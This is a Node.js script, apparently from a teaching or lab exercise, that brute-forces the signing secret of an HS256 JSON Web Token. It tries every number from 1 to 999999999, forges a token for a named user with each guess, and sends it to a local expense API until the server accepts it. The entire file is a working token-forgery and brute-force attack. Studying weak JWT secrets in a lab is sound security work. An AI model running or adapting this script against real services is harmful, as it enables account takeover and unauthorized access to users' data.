const jwt = require('jsonwebtoken');
const axios = require('axios');

const payload = {
    "sub": 1,
    "email": "marco@techstarter.de",
    "iat": 1709375495,
    "exp": 1709634695
};
const base_url = 'http://localhost:3000/api/expense';
const options = {
    algorithm: 'HS256'
};

async function bruteForceJWT() {
    let startTime = new Date();
    for (let secret = 1; secret <= 999999999; secret++) {
        try {
            const token = jwt.sign(payload, secret.toString(), options);
            try {
                const response = await axios.get(base_url, {
                    headers: {
                        'Authorization': `Bearer ${token}`
                    }
                });

                if (response.status === 200) {
                    let endTime = new Date();
                    let timeSpent = (endTime - startTime) / 1000;
                    console.log("Token Secret hacked:", secret);
                    console.log("Vergangene Zeit:", timeSpent + "sec");

                    break;
                }
            } catch (error) {
                if (error.response && (error.response.status === 401 || error.response.status === 200)) {
                    console.log(`Error Response: ${error.response.status}, Secret: ${secret}`);
                    // Optional: Breche die Schleife ab, wenn gewünscht
                    // break;
                } else {
                    console.error(`An error occurred for secret ${secret}:`, error.message);
                }
            }
        } catch (err) {
            console.error(`JWT Error for secret ${secret}:`, err.message);
        }
    }
}

bruteForceJWT();